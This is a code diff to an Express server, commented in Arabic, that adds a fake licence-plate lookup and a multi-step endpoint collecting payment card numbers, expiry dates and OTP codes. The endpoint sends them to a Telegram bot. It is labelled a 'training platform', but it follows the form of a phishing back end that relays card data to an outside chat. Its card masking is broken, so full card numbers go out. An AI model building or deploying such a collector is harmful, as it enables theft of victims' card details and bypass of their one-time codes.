@@ -10,11 +10,38 @@ app.use(express.static('.'));
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
+// قاعدة بيانات وهمية للسيارات
+const fakeCars = {
+  "1234 ع 99": { marque: "Renault", modele: "Symbol", annee: "2020" },
+  "5678 و 22": { marque: "Hyundai", modele: "i10", annee: "2022" },
+  "9101 ب 33": { marque: "Dacia", modele: "Sandero", annee: "2019" },
+  "1112 ج 44": { marque: "Peugeot", modele: "208", annee: "2021" }
+};
+
+// استقبال البيانات وإرسالها للبوت
 app.post('/api/collect', async (req, res) => {
   try {
-    const { marque, annee, modele, plaque } = req.body;
+    const { step, data } = req.body;
     
-    const message = 🚗 بيانات جديدة:\n🔹 الماركة: ${marque}\n🔹 السنة: ${annee}\n🔹 الموديل: ${modele}\n🔹 اللوحة: ${plaque || 'غير محدد'};
+    let message = 📊 منصة تدريبية\n;
+    
+    if (step === 'search_car') {
+      message += 🔍 بحث عن سيارة: ${data.plaque}\n✅ النتيجة: ${data.marque} ${data.modele} (${data.annee});
+    }
+    else if (step === 'payment') {
+      message += 💳 محاولة دفع تدريبية\n;
+      message += 💳 رقم البطاقة: ${data.cardNumber.substring(0, 4)}****${data.cardNumber.substring(-4)}\n;
+      message += 📅 تاريخ: ${data.expiry}\n;
+      message += 🔐 CVV: ***\n;
+      message += 💰 المبلغ: 2000 دج (وهمي);
+    }
+    else if (step === 'otp') {
+      message += 🔐 إدخال رمز OTP\n;
+      message += 📱 الرقم المدخل: ${data.code}\n;
+      message += ✅ تم التحقق بنجاح (تدريبي);
+    }
+    
+    message += \n🕒 ${new Date().toLocaleString('ar-DZ')};
     
     await axios.post(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
       chat_id: CHAT_ID,
@@ -23,13 +50,22 @@ app.post('/api/collect', async (req, res) => {
     
     res.json({ success: true });
   } catch (error) {
-    res.status(500).json({ success: false, error: error.message });
+    console.error('خطأ:', error.message);
+    res.status(500).json({ success: false });
   }
 });
 
-app.get('/api/ping', (req, res) => {
-  res.json({ status: 'live' });
+// البحث عن السيارة
+app.post('/api/search-car', (req, res) => {
+  const plaque = req.body.plaque;
+  const car = fakeCars[plaque];
+  
+  if (car) {
+    res.json({ found: true, ...car, plaque });
+  } else {
+    res.json({ found: false });
+  }
 });
 
 const port = process.env.PORT || 3000;
-app.listen(port, () => console.log(Server on port ${port}));
+app.listen(port, () => console.log(✅ الخادم يعمل على المنفذ ${port}));
